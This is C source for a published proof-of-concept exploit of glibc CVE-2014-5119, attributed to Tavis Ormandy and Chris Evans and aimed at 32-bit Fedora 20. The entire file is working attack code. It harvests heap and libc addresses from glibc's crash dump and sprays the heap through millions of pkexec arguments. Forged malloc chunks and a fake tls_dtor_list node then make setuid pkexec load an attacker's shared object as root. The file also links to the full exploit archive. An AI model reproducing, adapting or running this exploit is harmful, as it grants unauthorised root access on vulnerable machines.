//
// Full Exploit: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/34421.tar.gz (CVE-2014-5119.tar.gz)
//
//
// ---------------------------------------------------
// CVE-2014-5119 glibc __gconv_translit_find() exploit
// ------------------------ taviso & scarybeasts -----
//
// Tavis Ormandy <taviso@cmpxhg8b.com>
// Chris Evans   <scarybeasts@gmail.com>
//
// Monday 25th August, 2014
//

#define _GNU_SOURCE
#include <err.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdarg.h>
#include <stddef.h>
#include <signal.h>
#include <string.h>
#include <termios.h>
#include <stdbool.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/utsname.h>
#include <sys/resource.h>

// Minimal environment to trigger corruption in __gconv_translit_find().
static char * const kCorruptCharsetEnviron[] = {
    "CHARSET=//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    NULL,
};

static const struct rlimit kRlimMax = {
    .rlim_cur = RLIM_INFINITY,
    .rlim_max = RLIM_INFINITY,
};

static const struct rlimit kRlimMin = {
    .rlim_cur = 1,
    .rlim_max = 1,
};

// A malloc chunk header.
typedef struct {
    size_t    prev_size;
    size_t    size;
    uintptr_t fd;
    uintptr_t bk;
    uintptr_t fd_nextsize;
    uintptr_t bk_nextsize;
} mchunk_t;

// A tls_dtor_list node.
typedef struct {
    uintptr_t   func;
    uintptr_t   obj;
    uintptr_t   map;
    uintptr_t   next;
} dlist_t;

// The known_trans structure glibc uses for transliteration modules.
typedef struct {
    uint8_t    info[32];
    char      *fname;
    void      *handle;
    int        open_count;
} known_t;

enum {
    LOG_DEBUG,
    LOG_WARN,
    LOG_ERROR,
    LOG_FATAL,
};

// Round up an integer to the next PAGE_SIZE boundary.
static inline uintptr_t next_page_size(uintptr_t size)
{
    return (size + PAGE_SIZE - 1) & PAGE_MASK;
}

// Allocate a buffer of specified length, starting with s, containing c, terminated with t.
static void * alloc_repeated_string(size_t length, int s, int c, int t)
{
    return memset(memset(memset(malloc(length), t, length), c, length - 1), s, 1);
}

static void logmessage(int level, const char * format, ...)
{
    va_list ap;

    switch (level) {
        case LOG_DEBUG: fprintf(stderr, "[*] "); break;
        case LOG_WARN:  fprintf(stderr, "[*] "); break;
        case LOG_ERROR: fprintf(stderr, "[!] "); break;
    }

    va_start(ap, format);
        vfprintf(stderr, format, ap);
    va_end(ap);

    fputc('\n', stderr);

    if (level == LOG_ERROR) {
        _exit(EXIT_FAILURE);
    }
}

// Parse a libc malloc assertion message to extract useful pointers.
//
// Note, this isn't to defeat ASLR, it just makes it more portable across
// different system configurations. ASLR is already nullified using rlimits,
// although technically even that isn't necessary.
static int parse_fatal_error(uintptr_t *chunkptr, uintptr_t *baseaddr, uintptr_t *bssaddr, uintptr_t *libcaddr)
{
    FILE *pty;
    char *mallocerror;
    char *memorymap;
    char *line;
    char *prev;
    char message[1 << 14];
    char *anon = NULL;
    char r, w, x, s;
    ssize_t count;
    int status;
    uintptr_t mapstart;
    uintptr_t mapend;

    // Unfortunately, glibc writes it's error messaged to /dev/tty. This cannot
    // be changed in setuid programs, so this wrapper catches tty output.
    while (true) {
        // Reset any previous output.
        memset(message, 0, sizeof message);

        logmessage(LOG_DEBUG, "Attempting to invoke pseudo-pty helper (this will take a few seconds)...");

        if ((pty = popen("./pty", "r")) == NULL) {
            logmessage(LOG_ERROR, "failed to execute pseudo-pty helper utility, cannot continue");
        }

        if ((count = fread(message, 1, sizeof message, pty)) <= 0) {
            logmessage(LOG_ERROR, "failed to read output from pseudo-pty helper, %d (%m)", count, message);
        }

        logmessage(LOG_DEBUG, "Read %u bytes of output from pseudo-pty helper, parsing...", count);

        pclose(pty);

        mallocerror = strstr(message, "corrupted double-linked list");
        memorymap = strstr(message, "======= Memory map: ========");

        // Unfortunately this isn't reliable, keep trying until it works.
        if (mallocerror == NULL || memorymap == NULL) {
            logmessage(LOG_WARN, "expected output missing (this is normal), trying again...");
            continue;
        }

        logmessage(LOG_DEBUG, "pseudo-pty helper succeeded");
        break;
    }

    *baseaddr = 0;
    *chunkptr = 0;
    *bssaddr  = 0;
    *libcaddr = 0;

    logmessage(LOG_DEBUG, "attempting to parse libc fatal error message...");

    // Verify this is a message we understand.
    if (!mallocerror || !memorymap) {
        logmessage(LOG_ERROR, "unable to locate required error messages in crash dump");
    }

    // First, find the chunk pointer that malloc doesn't like
    if (sscanf(mallocerror, "corrupted double-linked list: %p ***", chunkptr) != 1) {
        logmessage(LOG_ERROR, "having trouble parsing this error message: %.20s", mallocerror);
    };

    logmessage(LOG_DEBUG, "discovered chunk pointer from `%.20s...`, => %p", mallocerror, *chunkptr);
    logmessage(LOG_DEBUG, "attempting to parse the libc maps dump...");

    // Second, parse maps.
    for (prev = line = memorymap; line = strtok(line, "\n"); prev = line, line = NULL) {
        char filename[32];

        // Reset filename.
        memset(filename, 0, sizeof filename);

        // Just ignore the banner printed by glibc.
        if (strcmp(line, "======= Memory map: ========") == 0) {
            continue;
        }

        if (sscanf(line, "%08x-%08x %c%c%c%c %*8x %*s %*u %31s", &mapstart, &mapend, &r, &w, &x, &s, filename) >= 1) {
            // Record the last seen anonymous map, in case the kernel didn't tag the heap.
            if (strlen(filename) == 0) {
                anon = line;
            }

            // If the kernel did tag the heap, then everything is easy.
            if (strcmp(filename, "[heap]") == 0) {
                logmessage(LOG_DEBUG, "successfully located first morecore chunk w/tag @%p", mapstart);
                *baseaddr = mapstart;
            }

            // If it didn't tag the heap, then we need the anonymous chunk before the stack.
            if (strcmp(filename, "[stack]") == 0 && !*baseaddr) {
                logmessage(LOG_WARN, "no [heap] tag was found, using heuristic...");
                if (sscanf(anon, "%08x-%*08x %*c%*c%*c%*c %*8x %*s %*u %31s", baseaddr, filename) < 1) {
                    logmessage(LOG_ERROR, "expected to find heap location in line `%s`, but failed", anon);
                }
                logmessage(LOG_DEBUG, "located first morecore chunk w/o tag@%p", *baseaddr);
            }

            if (strcmp(filename, "/usr/lib/libc-2.18.so") == 0 && x == 'x') {
                logmessage(LOG_DEBUG, "found libc.so mapped @%p", mapstart);
                *libcaddr = mapstart;
            }

            // Try to find libc bss.
            if (strlen(filename) == 0 && mapend - mapstart == 0x102000) {
                logmessage(LOG_DEBUG, "expecting libc.so bss to begin at %p", mapstart);
                *bssaddr = mapstart;
            }
            continue;
        }

        logmessage(LOG_ERROR, "unable to parse maps line `%s`, quiting", line);
        break;
    }

    return (*chunkptr == 0 || *baseaddr == 0 || *bssaddr == 0 || *libcaddr == 0) ? 1 : 0;
}

static const size_t heap_chunk_start = 0x506c8008;
static const size_t heap_chunk_end   = 0x506c8008 + (2 * 1024 * 1024);

static const size_t nstrings = 15840000;

// The offset into libc-2.18.so BSS of tls_dtor_list.
static const uintptr_t kTlsDtorListOffset = 0x12d4;

// The DSO we want to load as euid 0.
static const char kExploitDso[] = "./exploit.so";

int main(int argc, const char* argv[])
{
    uintptr_t baseaddr;
    uintptr_t chunkptr;
    uintptr_t bssaddr;
    uintptr_t libcaddr;
    uint8_t  *param;
    char    **args;
    dlist_t  *chain;
    struct utsname ubuf;

    // Look up host type.
    if (uname(&ubuf) != 0) {
        logmessage(LOG_ERROR, "failed to query kernel information");
    }

    logmessage(LOG_DEBUG, "---------------------------------------------------");
    logmessage(LOG_DEBUG, "CVE-2014-5119 glibc __gconv_translit_find() exploit");
    logmessage(LOG_DEBUG, "------------------------ taviso & scarybeasts -----");

    // Print some warning that this isn't going to work on Ubuntu.
    if (access("/etc/fedora-release", F_OK) != 0 || strcmp(ubuf.machine, "i686") != 0)
        logmessage(LOG_WARN, "This proof of concept is designed for 32 bit Fedora 20");

    // Extract some useful pointers from glibc error output.
    if (parse_fatal_error(&chunkptr, &baseaddr, &bssaddr, &libcaddr) != 0) {
        logmessage(LOG_ERROR, "unable to parse libc fatal error message, please try again.");
    }

    logmessage(LOG_DEBUG, "allocating space for argument structure...");

    // This number of "-u" arguments is used to spray the heap.
    // Each value is a 59-byte string, leading to a 64-byte heap chunk, leading to a stable heap pattern.
    // The value is just large enough to usuaully crash the heap into the stack without going OOM.
    if ((args = malloc(((nstrings * 2 + 3) * sizeof(char *)))) == NULL) {
        logmessage(LOG_ERROR, "allocating argument structure failed");
    }

    logmessage(LOG_DEBUG, "creating command string...");

    args[nstrings * 2 + 1] = alloc_repeated_string(471, '/', 1, 0);
    args[nstrings * 2 + 2] = NULL;

    logmessage(LOG_DEBUG, "creating a tls_dtor_list node...");

    // The length 59 is chosen to cause a 64byte allocation by stdrup. That is
    // a 60 byte nul-terminated string, followed by 4 bytes of metadata.
    param = alloc_repeated_string(59, 'A', 'A', 0);
    chain = (void *) param;

    logmessage(LOG_DEBUG, "open_translit() symbol will be at %p", libcaddr + _OPEN_TRANSLIT_OFF);
    logmessage(LOG_DEBUG, "offsetof(struct known_trans, fname) => %u", offsetof(known_t, fname));

    chain->func = libcaddr + _OPEN_TRANSLIT_OFF;
    chain->obj  = baseaddr + 8 + sizeof(*chain) - 4 - offsetof(known_t, fname);
    chain->map  = baseaddr + 8 + sizeof(*chain);
    chain->next = baseaddr + 8 + 59 - strlen(kExploitDso);

    logmessage(LOG_DEBUG, "appending `%s` to list node", kExploitDso);

    memcpy(param + 59 - strlen(kExploitDso), kExploitDso, 12);

    logmessage(LOG_DEBUG, "building parameter list...");
    for (int i = 0; i < nstrings; ++i) {
        args[i*2 + 1] = "-u";
        args[i*2 + 2] = (void *) chain;
    }

    // Verify we didn't sneak in a NUL.
    assert(memchr(chain, 0, sizeof(chain)) == NULL);

    logmessage(LOG_DEBUG, "anticipating tls_dtor_list to be at %p", bssaddr + kTlsDtorListOffset);

    // Spam all of possible chunks (some are unfortunately missed).
    for (int i = 0; true; i++) {
        uintptr_t chunksize         = 64;
        uintptr_t chunkaddr         = baseaddr + i * chunksize;
        uintptr_t targetpageoffset  = chunkptr & ~PAGE_MASK;
        uintptr_t chunkpageoffset   = PAGE_MASK;
        uintptr_t mmapbase          = 31804 + ((0xFD8 - targetpageoffset) / 32);
        uint8_t  *param             = NULL;
        mchunk_t chunk              = {
            .prev_size              = 0xCCCCCCCC,
            .size                   = 0xDDDDDDDD,
            .fd_nextsize            = bssaddr + kTlsDtorListOffset - 0x14,
            .bk_nextsize            = baseaddr + 8,
        };

        // Compensate for heap metadata every 1MB of allocations.
        chunkaddr += 8 + (i / (1024 * 1024 / chunksize - 1) * chunksize);

        if (chunkaddr < heap_chunk_start)
            continue;

        if (chunkaddr > heap_chunk_end)
            break;

        chunkpageoffset = chunkaddr & ~PAGE_MASK;

        if (chunkpageoffset > targetpageoffset) {
            continue;
        }

        if (targetpageoffset - chunkpageoffset > chunksize) {
            continue;
        }

        // Looks like this will fit, compensate the pointers for alignment.
        chunk.fd = chunk.bk = chunkaddr + (targetpageoffset - chunkpageoffset);

        if (memchr(&chunk, 0, sizeof chunk)) {
            logmessage(LOG_WARN, "parameter %u would contain a nul, skipping", i);
            continue;
        }
        args[mmapbase + i * 2] = param = alloc_repeated_string(60, 'A', 'A', 0);

        memcpy(param + (targetpageoffset - chunkpageoffset),
               &chunk,
               sizeof chunk);
    }

    setrlimit(RLIMIT_STACK, &kRlimMax);
    setrlimit(RLIMIT_DATA, &kRlimMin);

    args[0] = "pkexec";

    logmessage(LOG_DEBUG, "execvpe(%s...)...", args[0]);
    execvpe("pkexec", args, kCorruptCharsetEnviron);
}